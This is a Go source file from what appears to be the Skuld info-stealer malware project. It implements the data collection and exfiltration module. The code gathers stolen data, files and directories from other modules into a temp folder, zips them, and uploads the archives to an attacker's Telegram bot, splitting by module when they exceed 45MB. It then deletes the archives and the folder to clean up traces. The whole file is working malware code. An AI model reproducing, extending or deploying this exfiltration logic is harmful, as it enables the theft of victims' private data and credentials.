package collector

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/telegram"
)

type DataCollector struct {
	TempDir     string
	TelegramBot *telegram.TelegramBot
	mutex       sync.Mutex
}

func NewDataCollector(botToken, chatID string) *DataCollector {
	tempDir := filepath.Join(os.TempDir(), "skuld-collected-data")
	os.MkdirAll(tempDir, os.ModePerm)

	return &DataCollector{
		TempDir:     tempDir,
		TelegramBot: telegram.NewTelegramBot(botToken, chatID),
	}
}

func (dc *DataCollector) AddData(moduleName string, data interface{}) {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	// Handle different data types
	switch v := data.(type) {
	case string:
		// If it's a string, treat it as file content
		filePath := filepath.Join(moduleDir, "data.txt")
		fileutil.AppendFile(filePath, v)
	case map[string]interface{}:
		// If it's structured data, save as text
		filePath := filepath.Join(moduleDir, "info.txt")
		for key, value := range v {
			fileutil.AppendFile(filePath, fmt.Sprintf("%s: %v", key, value))
		}
	}
}

func (dc *DataCollector) AddFile(moduleName, sourceFile, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyFile(sourceFile, destPath)
}

func (dc *DataCollector) AddDirectory(moduleName, sourceDir, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyDir(sourceDir, destPath)
}

func (dc *DataCollector) SendCollectedData() error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	// Check if we have any data to send
	files, err := os.ReadDir(dc.TempDir)
	if err != nil || len(files) == 0 {
		return fmt.Errorf("no data collected to send")
	}

	// Create final archive
	archivePath := filepath.Join(os.TempDir(), "skuld-data.zip")
	
	if err := fileutil.Zip(dc.TempDir, archivePath); err != nil {
		return fmt.Errorf("failed to create archive: %v", err)
	}

	// Check archive size and split if necessary (Telegram has 50MB limit)
	archiveInfo, err := os.Stat(archivePath)
	if err != nil {
		return fmt.Errorf("failed to get archive info: %v", err)
	}

	// If archive is larger than 45MB, send individual module archives
	if archiveInfo.Size() > 45*1024*1024 {
		os.Remove(archivePath)
		return dc.sendModuleArchives()
	}

	// Send single archive via Telegram
	caption := fmt.Sprintf("🔍 Skuld Data Collection Complete\n📦 Archive size: %.2f MB\n📁 Contains all collected data", float64(archiveInfo.Size())/(1024*1024))
	if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
		// Clean up and return error
		os.Remove(archivePath)
		return fmt.Errorf("failed to send data via Telegram: %v", err)
	}

	// Clean up
	os.Remove(archivePath)
	return nil
}

func (dc *DataCollector) sendModuleArchives() error {
	modules, err := os.ReadDir(dc.TempDir)
	if err != nil {
		return fmt.Errorf("failed to read temp directory: %v", err)
	}

	for _, module := range modules {
		if !module.IsDir() {
			continue
		}

		modulePath := filepath.Join(dc.TempDir, module.Name())
		archivePath := filepath.Join(os.TempDir(), fmt.Sprintf("skuld-%s.zip", module.Name()))

		if err := fileutil.Zip(modulePath, archivePath); err != nil {
			continue // Skip this module if zip fails
		}

		archiveInfo, err := os.Stat(archivePath)
		if err != nil {
			os.Remove(archivePath)
			continue
		}

		caption := fmt.Sprintf("📦 Module: %s\n💾 Size: %.2f MB", module.Name(), float64(archiveInfo.Size())/(1024*1024))
		if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
			os.Remove(archivePath)
			continue // Continue with other modules even if one fails
		}

		os.Remove(archivePath)
	}

	return nil
}

func (dc *DataCollector) SendMessage(message string) error {
	return dc.TelegramBot.SendMessage(message)
}

func (dc *DataCollector) Cleanup() {
	os.RemoveAll(dc.TempDir)
}